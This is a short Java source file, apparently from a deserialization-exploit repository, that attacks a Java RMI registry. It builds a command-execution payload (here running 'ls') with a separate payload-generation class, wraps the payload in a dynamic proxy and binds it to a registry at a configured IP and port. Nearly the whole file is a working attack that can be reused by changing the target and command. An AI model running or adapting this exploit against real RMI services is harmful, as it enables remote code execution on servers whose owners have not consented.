// https://github.com/angelwhu/java_unserialize
package io.github.yuetsin.exploit;

import io.github.yuetsin.payload.PayloadGeneration;

import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.Remote;
import java.lang.reflect.InvocationHandler;

public class Exploit {
    static String ip = "127.0.0.1";
    static Integer port = 30050;

    public static void main(String[] args) {
        try {
            Object instance = PayloadGeneration.generateExecPayload("ls");

            InvocationHandler h = (InvocationHandler) instance;
            Remote r = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),new Class[]{Remote.class}, h));
            Registry registry = LocateRegistry.getRegistry(ip, port);
            registry.bind("0ops", r);
        }
        catch (Throwable e) 
        {
            e.printStackTrace();
        }
    }
}
